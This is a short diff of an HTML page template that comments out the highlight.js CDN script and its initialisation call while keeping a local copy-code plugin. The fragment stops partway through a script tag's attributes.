+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
                     <script>
                       hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
-                    </script><script src="/js/plugins/copycode.js"></script>
+                    </script> --><script src="/js/plugins/copycode.js"></script>
     <script type="text/javascript" 
       color="220,220,220" 
       opacity="0.7" 
